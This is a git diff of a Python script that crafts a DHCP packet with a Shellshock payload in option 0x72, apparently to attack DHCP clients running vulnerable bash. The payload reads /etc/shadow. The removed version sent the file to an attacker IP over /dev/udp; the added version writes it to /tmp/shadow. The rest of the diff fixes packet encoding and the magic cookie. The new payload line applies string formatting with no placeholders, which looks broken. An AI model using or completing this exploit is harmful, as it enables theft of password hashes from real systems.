@@ -1,4 +1,5 @@
 from binascii import hexlify
+import binascii
 import socket
 import select
 import collections
@@ -12,39 +13,46 @@ def flatten_list(ze_list):
             yield sublist
 
 
+
 class Client:
     def __init__(self):
         self.ip = b'192.168.110.23'
         print(self.ip)
         self.port = 8008
-        self.exploit = hexlify(b"() { :;}; /usr/bin/cat /etc/shadow > /dev/udp/%b/%d" % (self.ip, self.port))
-        self.exploit = [self.exploit[i:i + 2] for i in range(0, len(self.exploit), 2)]
-        self.exploit_len = b'%x' % (len(self.exploit))
+
+        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow" % (self.ip, self.port)
+        self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
+        print(self.exploit)
+        print(len(self.exploit))
+        self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
+        print(self.exploit_len)
+        # exit()
+
         self.dhcp_packet = self.craft_packet()
 
     def craft_packet(self):
-        op = [b'01']  # REquest=ff or reply=00
-        htype = [b'01']  # Hardware address type 01=ethernet
-        hlen = [b'06']  # Hardware length
-        hops = [b'00']  # hops; number of relay agents the message travels through, each one will add one
-        xid = [b'00', b'00', b'17', b'3d']  # Transaction ID a random number chosen by the client to identify an ip address allocation
-        secs = [b'00']*2  # number of seconds elapsed since clent sent a dhcp request
-        flags = [b'00']*2  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
-        ciaddr = [b'00']*4  # client ip address
-        yiaddr = [b'00']*4  # 'your' ip address, as assigned by server
-        siaddr = [b'00']*4  # Server ip address
+        op = [b'\x01']  # REquest=ff or reply=00
+        htype = [b'\x01']  # Hardware address type 01=ethernet
+        hlen = [b'\x06']  # Hardware length
+        hops = [b'\x00']  # hops; number of relay agents the message travels through, each one will add one
+        xid = [b'\x00', b'\x00', b'\x17', b'\x3d']  # Transaction ID a random number chosen by the client to identify an ip address allocation
+        secs = [b'\x00']*2  # number of seconds elapsed since clent sent a dhcp request
+        flags = [b'\x00']*2  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
+        ciaddr = [b'\x00']*4  # client ip address
+        yiaddr = [b'\x00']*4  # 'your' ip address, as assigned by server
+        siaddr = [b'\x00']*4  # Server ip address
 
-        giaddr = [b'00']*4  # first relay agent ip address
-        chaddr = [b'00', b'1b', b'52', b'01', b'fc', b'42']  # client hardware address
-        chaddr_padding = [b'00']*(16-len(chaddr))
-        sname = [b'00']*64  # server host name
-        file = [b'00']*128  # bootfile name, routing information defined by server to the client
-        magic_cookie = [b'00']
-        options = [b'35', b'01', b'01',  # DHCP, len, Offer
-                   b'3d', b'07', b'01', chaddr, # client id
-                   b'37', b'04', b'01', b'03', b'06', b'2a',
-                   b'72', self.exploit_len, self.exploit,
-                   b'ff',  # end flag
+        giaddr = [b'\x00']*4  # first relay agent ip address
+        chaddr = [b'\x00', b'\x1b', b'\x52', b'\x01', b'\xfc', b'\x42']  # client hardware address
+        chaddr_padding = [b'\x00']*(16-len(chaddr))
+        sname = [b'\x00']*64  # server host name
+        file = [b'\x00']*128  # bootfile name, routing information defined by server to the client
+        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
+        options = [b'\x35', b'\x01', b'\x01',  # DHCP, len, Offer
+                   b'\x3d', b'\x07', b'\x01', chaddr, # client id
+                   b'\x37', b'\x04', b'\x01', b'\x03', b'\x06', b'\x2a',
+                   b'\x72', self.exploit_len, self.exploit,
+                   b'\xff',  # end flag
                    # padding to end at word boundry for the options
                    ]
 
@@ -58,7 +66,7 @@ class Client:
 
         print(options_padding_length / 4)
         if options_padding_length > 1:
-            options_padding = [[b'00'] * (options_padding_length - 1), [b'0a']]
+            options_padding = [[b'\x00'] * (options_padding_length - 1), [b'\x0a']]
             options_padding = list(flatten_list(options_padding))
 
             return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr,chaddr_padding, sname,
@@ -69,8 +77,15 @@ class Client:
                              file, magic_cookie, options]
 
         return_packet = [item for sublist in return_packet for item in sublist]
-        return_packet = b' '.join(return_packet)
+        print(return_packet)
+        return_packet = b''.join(return_packet)
+
         return_packet = bytearray(return_packet)
+
+
+
+
+
         return return_packet
 
     def start_sockets(self):
